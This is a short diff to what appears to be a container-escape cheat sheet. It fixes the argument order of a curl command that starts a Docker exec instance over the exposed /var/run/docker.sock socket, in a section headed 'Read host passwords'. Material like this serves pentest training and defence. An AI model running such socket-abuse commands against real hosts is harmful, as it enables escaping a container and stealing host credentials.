@@ -157,8 +157,7 @@ Read host passwords
 
 Grab the ID and use it in this command
 
-    curl --unix-socket /var/run/docker.sock  -H 'Content-Type: application/json' -XPOST --data-binary '{"Detach": false,"Tty": false}' --output -
- http://x/exec/<exec ID here>/start
+    curl --unix-socket /var/run/docker.sock  -H 'Content-Type: application/json' -XPOST --data-binary '{"Detach": false,"Tty": false}' http://x/exec/<exec ID here>/start --output - 
 
 ## Image Supply chain
 
